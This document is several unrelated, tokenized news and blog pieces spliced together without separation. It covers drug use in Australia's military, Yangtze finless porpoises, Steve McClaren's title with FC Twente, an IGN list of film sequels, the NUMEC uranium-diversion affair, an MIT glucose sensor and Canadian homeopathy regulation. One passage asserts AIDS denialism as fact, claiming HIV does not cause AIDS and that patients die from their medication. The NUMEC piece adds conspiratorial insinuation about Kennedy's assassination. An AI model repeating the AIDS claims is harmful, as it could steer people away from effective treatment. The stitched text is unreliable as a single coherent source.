Afghanistan produces 93 per cent of the world 's opium , the key ingredient of heroin .
" Afghanistan is a place where there 's a lot of narcotics , " said Defence Force Chief Angus Houston .
" They 're grown there and they 're manufactured there and this is a place where narcotics are more freely available probably than anywhere else in the world . "
Men and women in Australia 's Defence Force already face random and targeted drug tests .
They generally have fewer positive results than people in other professions who face drug testing , such as miners and police officers .
But Defence Minister John Faulkner still wants to know if the Defence testing program is adequate .
The history of opiate use by soldiers dates back to the American Civil War .
Heroin abuse was a big problem for the US military during the Vietnam War , exacerbated by the fact its military contained large numbers of conscripted soldiers .
In Afghanistan , however , all US troops are volunteers .
Dr Ben Wadham , an expert on army culture from Flinders University in South Australia , says drug use is also a problem in the Australian military .
" The Defence Force has had an ongoing issue with drug use amongst its ranks , " he said .
" They 've put together a number of inquiries and different strategies to address drug use but it remains a persistent issue .
" Drinking has always been an issue in the military and remains so , but even more so drugs become a way of young men dealing with the stressors of the military but also bonding together . "
Work hard , play hard
Dr Wadham says armed forces culture begins by constructing a strong difference between a soldier and a civilian .
" Soldiers bond together in particular ways and they also engage in quite risky operations , risky work , quite hard work , " he said .
" The way that particularly men in those armed corps bond together is by engaging in the work hard , play hard mentality . "
John Jarrett , president of the Young Diggers , a group that helps Australian servicemen and women cope with health issues , says self - medication through alcohol or drugs is a problem .
" We 've noticed that most of the self - medication is from alcohol abuse , but mainly after they get back , " he said .
" But yes , there are occasions where some of the troops will self - medicate over there I presume , but most of what we 're hearing is the alcohol abuse back in country . "
Drug testing is conducted among members of the Australian armed forces and there have been claims the military lacks the necessary strategies to deal with the problem .
But Mr Jarrett says he has seen some promising signs in recent months .
" We 've noticed in the past few months that the Defence Force are getting a lot better at that , " he said .
" I know it 's probably not our place to comment on it , but we 're very pleased with what we are seeing from the military , that they 've actually stood up and we 're seeing them do things and doing it well . "
Mr Jarrett has urged the military to maintain strong support for those soldiers affected by substance abuse .

For those who may not be so easily convinced , however , Greenwald and company not only explore the questionable motivations of the corporate decision - makers whose wartime profiteering has affected the lives of countless soldiers and their families , but also the increasingly negative international reputation of the United States as a result .

A captive finless porpoise
Finless porpoises , a rare type of toothed whale , may be even more endangered than previously thought .
A survey of finless porpoises in Asia has revealed there are two species , not one , and that they rarely intermingle .
More worrying , finless porpoises living in the freshwater of China 's Yangtze river are genetically unique , say scientists , who warn that greater efforts must be made to prevent these animals , numbering fewer than 1000 , from following another Yangtze cetacean , the Baiji , to extinction .
Special populations
Finless porpoises ( Neophocaena phocaenoides ) inhabit a wide range of tropical and temperate waters around the Indo - Pacific region .
For a long time , zoologists have noted how these porpoises appear to differ depending on where they live .
Most conservation biologists have a strong feeling that the Yangtze finless porpoise has a very high risk of extinction
Prof Guang Yang
Those living around China , for example , have a few different morphological characteristics depending whether they live in the Yellow Sea , South China Sea or up the Yangtze river , which holds fresh rather than seawater .
But a new study published in the journal Marine Biology has revealed just how distinct each population of finless porpoise is , with significant implications for their conservation and survival .
" The most surprising finding of this study is that the Yangtze finless porpoise represents a distinct genetic grouping , which is distinct from marine porpoises , " says Professor Guang Yang of Nanjing Normal University in China , who conducted the study with Professor Michael Bruford of Cardiff University , UK and colleagues at Nanjing .
Conservationists currently consider all finless porpoises to be the same species .
But Prof Yang and Prof Bruford 's team analysed the genes of 125 finless dolphins living around China , including in the Yellow and South China Sea and Yangtze river .
And the results suggest that special regard should be given to the freshwater porpoises , which should be managed and conserved separately , they say .
" The freshwater nature of this population makes it unique , " says Prof Yang .
The " jury is still out " on whether the Yangtze finless porpoise should be granted species status , as more data is required , say the scientists .
But it is so genetically unique , and rare , that special efforts should be made immediately to protect it .
1,000 and counting
" The most recent field survey conducted in 2006 suggested that there were around 1,000 individuals in the Yangtze River , " says Prof Yang .
" This is much smaller than previous estimates , suggesting a significant population decline in the past two decades . "
China is already considering upgrading the conservation status of the Yangtze population of finless porpoises , from a national II conservation grade to national I .
An extensive survey in 2006 failed to find any sign of the Baiji
However , " at least in China , most conservation biologists and cetologists have a strong feeling that the Yangtze finless porpoise has a very high risk of extinction , and is very likely to follow the Baiji to extinction within a short - term period unless conservation measures are put in place , " says Prof Yang .
The Yangtze River holds the dubious distinction of being the site of the first recorded extinction of a cetacean ( whale , dolphins and porpoises ) since records began .
In 2007 , conservationists declared extinct the Baiji ( Lipotes vexillifer ) , a species of river dolphin endemic to the Yangtze River , after repeated surveys over many years failed to sight a single animal .
Development , industry , pollution , overfishing and the commercial use of the river by boats have all been blamed for contributing to the Baiji 's demise .
No gene flow
The scientists ' survey also revealed that finless porpoises living in the sea should be considered two separate species .
Those porpoises living in the Yellow Sea are distinct from those in the South China Sea .

The genetic data showed there is no or very little gene flow between these two species , even in areas where they overlap .
Therefore each marine population should be conserved separately , warn the scientists .
Wolfsburg line up Steve McClaren as FC Twente crowned Eredivisie champions
Steve McClaren looks set to continue his managerial renaissance with German club Wolfsburg after clinching the Dutch league title on Sunday .
Branded a flop after his calamitous reign as England coach , McClaren , 49 today , has become a target for top - flight clubs across Europe after taking over at unfancied FC Twente two years ago and leading them to glory .
His side won 2 - 0 at NAC Breda , meaning nearest rivals Ajax - managed by former Tottenham boss Martin Jol - could not catch them despite a 4 - 1 victory over NEC .
Champion feeling : Steve McClaren is hoisted aloft by his victorious Twente players
' Fantastic .
We deserve it , ' said McClaren after being carried aloft by his players .
Ajax have been coming but we kept winning .
It 's unbelievable .
We got better and better after finishing second last season .
It is party time , so I do n't want to go into my future .
I want to enjoy the moment . '
West Ham co-owners David Sullivan and David Gold installed McClaren as their first choice after deciding to replace Gianfranco Zola , as revealed in Sportsmail a fortnight ago , and Sporting Lisbon have also been on his trail .
Interested : West Ham co-owners David Gold and David Sullivan ( pictured ) want to install Steve McClaren as manager
But he looks bound for Germany after a strong signal from Wolfsburg that he is on the verge of accepting their managerial offer .
' We will be making an announcement in the next week and it could be that the identity of our new coach will come as a surprise to a lot of people , ' said Wolfsburg general manager Dieter Hoeness .
Wolfsburg , backed by car giants Volkswagen , won the Bundesliga title under Felix Magath 12 months ago but are in the market for a new boss after sacking Armin Veh and leaving the team under the care of youth coach Lorenz - Gunther Kostner .
They can offer McClaren extensive transfer funds , as well as lucrative personal terms , and believe this will give them a decisive edge over Hamburg and Hoffenheim , who are also keen to recruit him .
Twente claimed the first Eredivisie title in the club 's 45 - year history against 10 - man NAC thanks to goals in either half from Bryan Ruiz and on - loan Chelsea midfielder Miroslav Stoch .
The opening goal arriving just seconds after NAC midfielder Csaba Feher had been sent off .
Pure delight : Steve McClaren celebrates FC
Twente 's first top - flight title
' This was a fantastic afternoon and it was amazing how my players handled the pressure , ' added McClaren .
' There was pressure from day one on these boys .
Yes , I am old enough to be the father of most of them , but I really enjoyed working with them .
They were so hungry and we have achieved an unbelievable thing .
' At the beginning of the season I said I did n't know whether we had the team to be the champions of Holland but we have done it .
CHAMPIONS ABROAD ... Roy Hodgson ( Sweden and Denmark )

' Last season we lost the cup final and finished second in the league but we kept growing and growing and today it proved that we are more experienced after all our big games in the Europa League . '
Twente president Joop Munsterman heaped praise on the man he brought to the club two seasons ago .
' What Steve has done with these boys is huge , ' said Munsterman , who was crying with joy at the final whistle .
' It is the most beautiful thing that ever happened to the town of Enschede and to this club .
I am shaking , I still can't believe he has pulled this off . '
Jol 's side finished the campaign with a goal difference of +86 - 46 better than Twente's - but had to settle for second place and a Champions League qualifying berth after finishing a point adrift .

Some of you reading may remember waiting in line to see the movie when it first released , the younger among you caught it on video years later , and still others did n't even watch Episode V until you 'd already been exposed to the Prequel Trilogy .
And yet , the one almost universal take on the film from all who 've seen it is that it is the best of the Star Wars movies .
This week , IGN is having a party for Empire in the only way we know how -- we 're looking back at its greatness with a series of retrospectives .
Today we kick off this series with what we 're calling " Why No. 2 is No. 1 . " For George Lucas ' original Star Wars sequel is n't the only second film of a series to surpass all the other pictures in its respective franchise ( including its predecessor ) in terms of sheer excellence .
Remember , this is n't a be -all , end - all list .
We 're fully aware that there are many other films that could 've made the cut here -- and also , this is all about franchises where the second movie has outshone all the other flicks .
Series with only one sequel need not apply ( sorry Nolan Bat - fans ) .
These are just a few of our favorites , in no particular order .
So read on , young Padawan , for a look back at some of the best number twos in movie history .
And when you 're done here , do n't forget to click over to our How Empire Changed Star Wars Forever story .
Mad Max was a cheap but effective B movie , the tale of a family man who is driven to the edge and beyond after his wife and child are murdered by savage bikers in a world that is on the verge of destruction .
But Mad Max II , a.k.a.
The Road Warrior , was that and so much more .
Not only was the production more polished -- well , polished in punk - meets - doomsday kinda way -- but so was the entire world of the title character .
Whatever semblance of civilization that remained in the first film is all but gone in part two , with Max a lone driver in a world gone mad .
The film has an altogether more epic scope , culminating in a wild car chase that ranks up there with the best of them .
And much like Empire 's follow - up , Return of the Jedi , The Road Warrior 's sequel , Beyond Thunderdome , would also turn out to be a piece of ice cream . : Chewie is Han Solo 's best friend .
Dog is Max 's best friend .
Both are as faithful as they come .
The first Spider - Man proved that a man could swing from a web ( thanks to an army of computer animators ) .
Spider - Man 2 proved that we could care about said web - slinger , even when he was n't of the superhero variety .
Sure , the original Sam Raimi film had its fair share of heart and humanity going on , but part two actually takes away Spidey 's powers , and instead of making those scenes the ones that the viewer must sit through while waiting to get back to the action , the director instead infuses them with some of the most memorable bits .
The awkward , geeky Peter Parker walking around the city to the tune of " Raindrops Keep Fallin ' on My Head " ?
The freeze - frame at the end of said scene ?
Priceless .
And the stuff in the red and blue tights is also great too , with the subway fight and its denouement -- as the citizens hoist a stricken Spider - Man up above their heads -- being perhaps the highlight of the entire series .
Again , the third film in the franchise would be another variation on Ewok central . :
Han and Leia face an insurmountable separation ; Peter and MJ face an insurmountable separation .
Possibly the best example of a movie that single - handedly redeemed -- and possibly saved -- an entire franchise , Wrath of Khan took everything that was wrong with the first Star Trek movie and righted it .
Those neutral , bland costumes and production design ?
Gone , replaced by a lush , bold look that actually looked lived in .
Of course Admiral Kirk and his crew would wear tunics that are more classical Navy than slumber party , threads that actually get blood on them when a young midshipman bites it .
And the story of the film sought to build on the mythology of the TV series , returning to a storyline that was some 15 years old , while also adding a " next generation , " as it were , to the cast that actually made the existing characters more human .
Bold , exciting , and alive , Star Trek II has yet to be topped by the nine films that have followed it . :
The loss of a dear friend and the promise of his return .
O.K. , this one might be a bit of a cheat , just because Aliens is so very different from the original Ridley Scott film that started it all .
Whereas Alien ( singular ! ) was a horror picture at heart , albeit one that happened to be set on a spaceship , James Cameron 's Aliens ( plural ! ) was much more an action - adventure - war picture .
But it broadened the scope of the franchise in such a way that there was simply no going back to the austere days onboard the Nostromo after it was released .
Multiple aliens , huge action , an increasingly tormented Ellen Ripley -- these would become the hallmarks of the series after Cameron got done with it .
And really , how long could you spend on just one ship yelling at Mother anyway ?
( Just for the record , the third Aliens film was mostly a loss , so this list has yet to encounter a franchise that actually got better from part two to part three Let 's keep trying , though . ) : Darth Vader to Luke : " I am your father . "
Newt to Ripley : " Mommy ! "
If the first Godfather is a delicious dish of baked ziti , the second is a full - on Sunday ragu dinner like Grandma used to make that is , if your Grandma was the type who ordered the executions of multiple mob bosses all at the same time , along with her dear , mentally slow brother .
Francis Ford Coppola 's second chapter in the saga of the Corleone family is mesmerizing , the kind of film that you just never tire of no matter how many times you 've seen it .
Part of the reason for that is the labyrinthine plot which continues to befuddle all but the fully immersed in the mythology of the world , but then there 's also the central character of Michael who just becomes harder and colder and more successful the further his story goes ( well , up until the third film , but that 's a different story ) .
The parallels between him and the flashbacks of his dad Vito 's rise from orphaned immigrant to young mafia chief are remarkable both for how similar the characters can be , and yet how perverted Vito 's dreams for his family have become by Michael 's acts of murder and self - isolation . : Hyman Roth = Lando Calrissian .
Only Lando did n't get what was coming to him like Roth did .
The 2010 Review Conference of the Treaty on the Non-Proliferation of Nuclear Weapons is underway at UN Headquarters in New York .
A working paper calls for a nuclear - free Middle East .
It would require member states of the NPT to “ disclose in their national reports on the implementation of the resolution on the Middle East all information available to them on the nature and scope of Israeli nuclear facilities and activities , including information pertaining to previous nuclear transfers to Israel . ”
On May 6 , 2010 , the Government Accountability Office ( formerly known as the General Accounting Office ) released the previously secret 1978 report “ Nuclear Diversion in the U.S.? 13 Years of Contradiction and Confusion ” [ .pdf ] .
It fills in important historic gaps about weapons - grade uranium diversions from the U.S. to Israel .
U.S. presidents have long acquiesced to “ strategic ambiguity ” – a policy of neither confirming nor denying that Israel even possesses nuclear weapons .
This pretext has allowed the U.S. to deliver the lion ’s share of its foreign assistance budget to Israel , despite clear legal prohibitions imposed by the Glenn and Symington amendments to the Foreign Assistance Act.
UN member countries have long suspected that the United States either turns a blind eye or actively supports the transfer of know - how , weapons - grade uranium , and dual - use technology to Israel .
The 62 - page General Accounting Office investigation and correspondence confirms the United States refuses to mount credible investigations that would enable warranted prosecutions of the perpetrators .
“ Nuclear Diversion in the U.S.? 13 Years of Contradiction and Confusion ” investigates the period between 1957 and 1967 when the Nuclear Materials and Equipment Corporation ( NUMEC ) received over 22 tons of uranium - 235 – the key material used to fabricate nuclear weapons .
NUMEC ’s founder and president Zalman M. Shapiro was head of a local Zionist Organization of America ( ZOA ) chapter and a sales agent for the Defense Ministry of Israel in the U.S.
In the early 1960s the Atomic Energy Commission ( AEC ) began documenting suspicious lapses in security at NUMEC ’s plant at Apollo , Pa .
In 1965 an AEC audit found NUMEC could no longer account for over 200 pounds of highly enriched uranium .
Subsequent estimates spiraled to almost 600 pounds .
The GAO was chartered by Congress to investigate four allegations about what happened to the uranium .
The first was that “ the material was illegally diverted to Israel by NUMEC management for use in nuclear weapons . ”
This was a result of early AEC and FBI investigations into the activities of Zalman Shapiro .
The second theory “ the material was diverted to Israel by NUMEC management with the assistance of the Central Intelligence Agency ( CIA ) ” came from the CIA ’s silence and demonstrated lack of interest in the entire matter .
The final theories explored by GAO were more general , that “ the material was diverted to Israel with the acquiescence of the United States Government ” or “ there has been a cover - up of the NUMEC incident by the United States Government . ”
GAO solicited all available information developed by the CIA , FBI , Department of Energy , and AEC , but was “ continually denied necessary reports and documentation … by the CIA and FBI . ” GAO attempted to fill in gaps or outright refusals to cooperate by directly interviewing FBI special agents .
The GAO also intended to make the report public , in order to respond to growing public concerns .
Rep. John Dingell ( D - Mich . ) , the chairman of the House Subcommittee on Energy and Power , who requested the inquiry , was assured six months before it was issued that only the most sensitive areas in the report would be classified .
The CIA and FBI insisted that the entire report be classified at the “ secret ” level over the objections of Dingell , who said , ” I think it is time that the public be informed about the facts surrounding the … affair and the possible diversion of bomb - grade uranium to Israel . ”
The GAO report lambastes the FBI ’s on - again off - again approach to investigating NUMEC : “ The FBI , which had the responsibility and authority to investigate the alleged incident , did not focus on the question of a possible nuclear diversion until May 1976 – nearly 11 years later .
Initially , the FBI declined DOE ’s request to conduct an investigation of the diversion possibility even though they are required to conduct such investigations under the Atomic Energy Act… . ”
The FBI ’s initial investigation during the 1960s quickly zeroed in on NUMEC management , but FBI recommendations for action were stymied .
According to the GAO , “ The FBI became so concerned about the security risks posed by NUMEC ’s president that they asked DOE whether it planned to terminate his security clearance or stop the flow of materials to NUMEC .
According to the FBI ’s liaison with GAO , the FBI recommended that NUMEC ’s operating license be taken away … . ”
When the FBI request was ignored , it dropped the entire investigation between 1969 and 1976 .
It took a direct order from President Gerald Ford in 1976 for the FBI and Department of Justice to “ address the diversion aspect . ”
The renewed investigation soon led to reversals of official U.S. government positions on NUMEC .
According to the GAO report , “ until the summer of 1977 , the only publicized Government view on the NUMEC incident was that there was no evidence to indicate that a diversion of nuclear material had occurred . ”
By February 1978 , the Nuclear Regulatory Commission ( NRC ) announced it had “ reconsidered ” its previous position that there had been “ no evidence ” to support diversion .
But the 11 - year gap “ obviously hampered ” the effort .
The GAO revealed that the DOE ’s nuclear materials safeguards , which before 1967 tracked the monetary value rather than the precise mass of the uranium , were seriously flawed .
NUMEC claimed key records covering a period of heavy uranium loss were destroyed during a “ labor dispute ” in 1964 .
NUMEC paid a $ 1.1 million fine for 206 pounds of missing uranium in 1966 , which closed the DOE case .
NUMEC also hired away one of the DOE ’s chief on - site investigators to enhance the appearance of serious materials control and accountability .
The GAO found that even by 1978 the FBI had not contacted key individuals in the affair .
An FBI agent - in - charge told the GAO it did not investigate the source of funds to pay NUMEC ’s DOE fine anticipating “ legal difficulties . ”
So the GAO investigated the matter , placing its own telephone calls to Mellon Bank .
The GAO report is highly critical of the CIA : “ From interviews with a former CIA official and with former and current officials and staff of DOE and the FBI we concluded that the CIA did not fully cooperate with DOE or the FBI in attempting to resolve the NUMEC matter . ”
The report is inconclusive about exactly what happened at NUMEC , but not about the agencies involved in the investigation through 1978 .
“ We believe a timely , concerted effort on the part of these three agencies would have greatly aided and possibly solved the NUMEC diversion questions , if they desired to do so . ”
The passage of time has removed any remaining doubts that NUMEC diverted uranium to Israel .
Rafael Eitan , who visited NUMEC in 1968 , was later revealed as the top Israeli spy targeting U.S. nuclear , national defense , and economic targets when his agent ( U.S. Navy analyst Jonathan Pollard ) was arrested spying for Israel in 1985 .
According to Anthony Cordesman , “ there is no conceivable reason for Eitan to have gone [ to the Apollo plant ] but for the nuclear material . ”
CIA Tel Aviv station chief John Hadden called NUMEC “ an Israeli operation from the beginning , ” a conclusion supported by its startup financing and initial ties to Israeli intelligence .
Why both the Lyndon Johnson and Richard Nixon administrations failed to credibly investigate NUMEC as a diversion challenge is also now obvious .
John F. Kennedy ’s direct diplomatic pressures for U.S. inspections of Israel ’s Dimona reactor grew throughout 1962 - 1963 .
During a Dec. 27 , 1963 , meeting with Foreign Minister Golda Meir , Kennedy expressed his hope that the relationship was a “ two - way street . ”
Meir reassured President Kennedy that there “ would not be any difficulty between us on the Israeli nuclear reactor . ”
Kennedy delivered a final ultimatum to Israel on July 5 , 1963 , insisting that Dimona undergo serial inspections “ in accord with international standards ” in order to verify its “ peaceful intent . ”
Simultaneously , the Kennedy Justice Department was waging an intense battle behind closed doors to register and regulate Israel ’s elite U.S. lobby , the American Zionist Council , which was bringing in funds from overseas to lobby .
Kennedy ’s assassination in November traumatized the nation and led to the complete and permanent reversal of both initiatives .
According to Avner Cohen , in 1958 Israeli Prime Minister David Ben Gurion had arranged with Abraham Feinberg , a “ major Democratic fund - raiser , ” to secretly finance a nuclear weapons program among “ benedictors ” in America .
Abraham Feinberg , who backed Harry S. Truman ’s successful whistle - stop election campaign , was personally succinct about his role in the U.S. political system : “ My path to power was cooperation in terms of what they needed – campaign money . ”
Feinberg opened doors in Congress for up and coming leaders of the Israel lobby , including AIPAC founder Isaiah L. Kenen .
According to Seymour Hersh , “ there is no question that Feinberg enjoyed the greatest presidential access and influence in his 20 years as a Jewish fund - raiser and lobbyist with Lyndon Johnson .
Documents at the Johnson Library show that even the most senior members of the National Security Council understood that any issue raised by Feinberg had to be answered . ”
His power and role in financing Lyndon B. Johnson ’s election prospects temporarily quashed scrutiny of Israel ’s nuclear weapons program – in the U.S. and abroad – at a critical moment .
On Oct. 14 , 1964 , less than three weeks before the 1964 presidential elections , Johnson ’s top administrative assistant Walter Jenkins was arrested in a public restroom on sexual solicitation charges .
At least $ 250,000 Abraham Feinberg raised for Johnson was located in Jenkins ’ office safe .
Johnson phoned his trusted aides Bill Moyers and Myer Feldman with orders to move the cash , which they did with the help of a heavy briefcase .
Israel would later replenish Feinberg ’s coffers ( as it had with Zalman Shapiro through sales commissions ) with multi-million dollar favors , such as major ownership in the nation ’s Coca - Cola franchise .
In 1968 as Israel noticeably ramped up activities at the Dimona nuclear weapons facility , Secretary of Defense Clark Clifford placed a final urgent call to Johnson , “ Mr. President , I do n’t want to live in a world where the Israelis have nuclear weapons . ”
President Johnson was abrupt before he hung up on Clifford , “ Do n’t bother me with this anymore . ”
By the time Israeli Prime Minister Golda Meier lobbied President Nixon to redefine U.S. non-proliferation policy as “ ambiguity ” toward Israeli nuclear weapons , Israel ’s stockpile and number of deployed weapons was steadily growing .
The report reveals why the 2010 Non-Proliferation Review Conference at the UN – like the GAO – is n’t really capable of challenging the true drivers of Middle East nuclear proliferation .
“ Nuclear Diversion in the U.S.? 13 Years of Contradiction and Confusion ” is a report so unique and noble in intent that there will probably never be another like it .
While it leaves unexplored the ongoing presence , influence , and effect of Israel ’s lobbyists working at the center of U.S. presidential administrations , for concerned Americans the GAO provides a snapshot of a moment in time before their Congress , aspiring politicians , and mid-level management of government agencies all “ got the memo . ”
In 2010 that unwritten memo reads something like this : Crimes committed in the name of Israel – no matter how audacious – will never be properly investigated , let alone prosecuted … so do n’t waste your time .
As you may know , AIDS is a heterogenous collection of over thirty diseases , well known before anyone even thought of acquired immune deficiency .
Those diseases have been lumped together for the sole reason of concurrent infection with a weakly defined " retroviral particle " called HIV or Human Immunodeficiency Virus .
AIDS is not a disease , it is a new definition given to a number of known illnesses .
There is immune weakness and it is due to a variety of lifestyle factors .
The HIV virus , which has never been shown to express any virulent or destructive capacity ( contrary to public belief it has never been shown to kill T cells ) has little or nothing to do with Aids .
Retroviral particles under the electron microscope
Yet expensive and highly toxic medications are given to those who " test " positive for two types of protein .
Most AIDS patients today do not die from immune weakness but from the side effects of the medications , which include cancer , heart failure and liver disease .
How did we ever get it this wrong ?
The following article looks at the early studies and the reasoning that led to a public announcement of having located " the probable cause of AIDS " in a virus particle that had neither been properly defined nor been described in any published study .
More than 25 years and tens of billions of dollars later , no vaccine has been developed , and we still treat people with immune weakness with drugs that will further weaken them .
" Twenty - five years of AIDS research have demonstrated the following : Gallo's " HTLV - III " has no particular , reproducible size or gene sequence ; the proteins that are supposed to belong to it and it alone are found in almost every human disease and condition .
The " LAV / HTLV - III /HIV " proteins and gene sequences have to be cobbled together through ' consensus agreement ' among different labs because while fishing in beaten - up cell cultures , researchers always find different things to call " HIV . "
Finally , " HIV " in any or all of its forms , has never been shown to even remotely affect T - Cells , which is the only meaningful prediction of AIDS theory .
But none of this has mattered to AIDS researchers , because AIDS theory is about fear , politics and social control , and has never been about science . "
If you care about someone who has been diagnosed with Aids or if you yourself have been told you are infected , or if you are just plain curious , you might want to delve into the history unfolding here .
As long as we ignore the details , we will not be able to overcome ... either the illness or the serious consequences , associated with the " cure " .
Oh and ... you should know that what you are about to read may make you angry , either at the author or at the people who push an indefensible paradigm , a medical doomsday scenario that is kept alive by billions upon billions of dollars , completely out of proportion with the spending for diseases that really do kill , like heart disease and cancer or even malaria and just plain old intestinal infections from dirty water ...
People with type I diabetes must prick their fingers several times a day to test their blood sugar level .
Though the pain is minor , the chore interferes with daily life .
“ They never really escape it , ” says Paul Barone , a postdoctoral researcher in MIT ’s Department of Chemical Engineering .
Barone and professor Michael Strano are working on a new type of blood glucose monitor that could not only eliminate the need for finger pricks but also offer more accurate readings .
“ Diabetes is an enormous problem , global in scope , and despite decades of engineering advances , our ability to accurately measure glucose in the human body still remains quite primitive , ” says Strano , the Charles and Hilda Roddey Associate Professor of Chemical Engineering .
“ It is a life - and - death issue for a growing number of people .
” Strano and Barone ’s sensing system consists of a “ tattoo ” of nanoparticles designed to detect glucose , injected below the skin .
A device similar to a wristwatch would be worn over the tattoo , displaying the patient ’s glucose levels .
2008 study in the New England Journal of Medicine showed that continuous monitoring helped adult type I diabetes patients who were at least 25 years old better control their blood glucose levels .
However , existing wearable devices are not as accurate as the finger - prick test and have to be recalibrated once or twice a day — a process that still involves pricking the finger .
“ The most problematic consequences of diabetes result from relatively short excursions of a person ’s blood sugar outside of the normal physiological range , following meals , for example , ” says Strano .
“ If we can detect and prevent these excursions , we can go a long way toward reducing the devastating impact of this disease .
” Most existing continuous glucose sensors work via an injection of an enzyme called glucose oxidase , which breaks down glucose .
An electrode placed on the skin interacts with a by - product of that reaction , hydrogen peroxide , allowing glucose levels to be indirectly measured .
However , none of those sensors have been approved for use longer than seven days at a time .
Bruce Buckingham , a professor of pediatric endocrinology at the Stanford School of Medicine and an author of the NEJM study , says glucose monitoring is definitely headed toward wearable sensors .
However , he expects it will be a few years before any are approved for use without backup monitoring with a finger prick test .
“ As time goes on , the devices to do this should become smaller , easier to wear , and more accurate , ” says Buckingham , who is not involved in the MIT project .
The technology behind the MIT sensor , described in a December 2009 issue of ACS Nano , is fundamentally different from existing sensors , says Strano .
The sensor is based on carbon nanotubes wrapped in a polymer that is sensitive to glucose concentrations .
When this sensor encounters glucose , the nanotubes fluoresce , which can be detected by shining near - infrared light on them .
Measuring the amount of fluorescence reveals the concentration of glucose .
The researchers plan to create an “ ink ” of these nanoparticles suspended in a saline solution that could be injected under the skin like a tattoo .
The “ tattoo ” would last for a specified length of time , probably six months , before needing to be refreshed .
To get glucose readings , the patient would wear a monitor that shines near - infrared light on the tattoo and detects the resulting fluorescence .
One advantage of this type of sensor is that , unlike some fluorescent molecules , carbon nanotubes are n’t destroyed by light exposure .
“ You can shine the light as long as you want , and the intensity wo n’t change , ” says Barone .
Because of this , the sensor can give continuous readings .
Development of the nanoparticles and the wearable monitor is being funded by MIT ’s Deshpande Center for Technological Innovation .
Barone and Strano are now working to improve the accuracy of their sensor .
Any glucose monitor must pass a test known as the Clarke Error Grid , the gold standard for glucose - sensor accuracy .
The test , which compares sensor results to results from a lab - based glucose meter , needs to be very stringent , since mistakes in glucose detection can be fatal .
They are still years away from human trials , says Barone , but they may soon start trials in animals .
Those tests will be key to determining the value of this approach , says Buckingham .
“ You do n’t know how good it will be until you put it in someone and see how strong the signal is , ” he says .

It ’s World Homeopathy Awareness Week .
Today ’s post examines the Canadian regulatory framework for homeopathic remedies .
Homeopathy is an alternative medicine system that was invented in the 1800 ’s and involves three main concepts : like - cures - like ( what causes a symptom can cure a symptom ) ; individualized treatments ( remedy selection considers factors like emotion and mood ) ; and less - is - more ( water has memory , and substances that are progressively diluted ( and shaken ) become stronger , not weaker . )
If homeopathy worked , what is known about biochemistry , physics , and pharmacology is wrong .
As expected , upon rigorous examination , there is no convincing evidence that effects attributed to homeopathy are anything more than placebo effects .
Yet not only are homeopathic products sold in Canada , their sale is regulated by the federal government , through Health Canada ’s Natural Health Products Directorate .
And we are assured of of the following :
Through the Natural Health Products Directorate , Health Canada ensures that all Canadians have ready access to natural health products that are safe , effective and of high quality , while respecting freedom of choice and philosophical and cultural diversity .
[ emphasis added ]
So , what gives ?
Science has established that homeopathy is no more effective than a placebo .
How did Health Canada determine otherwise ?
The Intent of Regulation
Health Canada sets the regulatory standards that determine which health and food products can be sold in Canada .
Until several years ago , Canadian natural health products ( NHPs ) fell into a regulatory grey zone .
Products were treated either as drugs , or as foods .
Consultation began in the late 1990 ’s on a new framework to provide appropriate levels of regulation and oversight to these products .
In 1998 , a report was tabled in the House of Commons : Natural Health Products : A New Vision .
It gave 53 recommendations , which included the following ( emphasis added ) :
# 19 . NHPs be allowed to make health claims , including structure - function claims , risk - reduction claims and treatment claims .
# 20 . Claims be assessed to ensure that there is reasonable evidence supporting the claim .
. # 21 .
The evidence not be limited to double blind clinical trials but also include other types of evidence such as generally accepted and traditional references , professional consensus , other types of clinical trials and other clinical or scientific evidence .
# 22 . The evidence required vary depending on the type of claim being made , with different evidence being required for structure - function claims and risk - reduction claims for minor self - limiting conditions than for therapeutic or treatment claims .
# 23 .
The label indicates clearly the type of evidence used to support the claim .
In 2004 , the Natural Health Product Regulations ( NHPR ) , under Canada ’s Food and Drugs Act , became a reality .
Rather than fully regulating these products as drugs , or leaving them virtually unregulated ( as is done in the United States ) , the NHPR were a regulatory compromise : Implementing manufacturing quality and safety standards , while significantly relaxing the standards for product efficacy claims .
The NHP regulations include products such as nutritional supplements , probiotics , traditional Chinese medicine , vitamins , herbal products , and homeopathy .
It ’s less clear why homeopathy was included , because homeopathy , at typical dilutions , do n’t contain a single molecule of the original substance .
In addition , homeopathy can involve “ dilution ” of substances that are not natural .
For example , a piece of the Great Wall of China , a shred of plastic wrap , gunpowder , or even prescription drugs like pregabalin can be converted into homeopathic “ remedies ” and are claimed to treat different symptoms .
The Current Day
The Natural Health Products Directorate has now been established for several years .
It has published detailed guidelines for the manufacturing , labeling and marketing claims for the different categories of NHPs .
Staff at the Directorate evaluate and approve new license applications .
Approved products are licensed into two categories , and given unique identification numbers :
DIN - HM ( homeopathic remedy number ) – all homeopathy
NPN ( natural health product number ) – all other natural products , including vitamins , probiotics , etc .
On this basis , Health Canada ’s granting of a DIN - HM means a review of safety and efficacy of a particular homeopathy remedy has been conducted , and a specific recommendation for use has been formally approved for the label .
So on what basis is Health Canada determining these remedies to be effective ?
It all comes down to the evidence standard .
What is Homeopathic “ Evidence ” ?
Health Canada ’s Evidence for Homeopathic Medicines : Guidance Document states that applications for licenses for homeopathic products must include evidence to support the “ safety , efficacy , and quality ” of a homeopathic medication .
All “ homeopathic medicine ” must be from substances referred to in the following :
Homeopathic Pharmacopeia of the United States ( HPUS )
Homöopathisches ArzneiBuch ( HAB )
Pharmacopée française ( PhF )
European Pharmacopoeia ( Ph. Eur . )
Encyclopedia of Homeopathic Pharmacopoeia ( EHP )
There are two categories of remedies : those that include a recommended use , and those that do not .
If the manufacturer wants to include a recommended use for the product , “ evidence ” must be provided .
Health Canada accepts different levels of evidence , from clinical trials , down to what it calls “ traditional use ” .
The two most common types of traditional use claims are provings , and references to homeopathic materia medica :
Provings : A homeopathic “ proving ” has nothing to do with proof – it ’s simply the exposure of an undiluted remedy to one or more healthy people , who document anything they experience .
The symptoms that are noted during a proving are believed to be the symptoms that the diluted remedy will cure – “ like cures like ” .
For a sample proving , check out the light reflecting off Saturn , and here are a few excerpts from a proving of a piece of the Berlin Wall :
I am in a new room , a stranger , nobody wants to have anything to do with me .
German language is spoken .
The room is a kind of cellar , half underground .
They cannot see me really , there is something with their eyes .
I want to touch people all the time I detest that in myself .
Immediately when touching the remedy I feel more at ease , I feel a separation between my energy and the energy of the other / the outside .
Holding the remedy for a while gives a tremendous rise of grief and sadness , so huge you would drown in it .
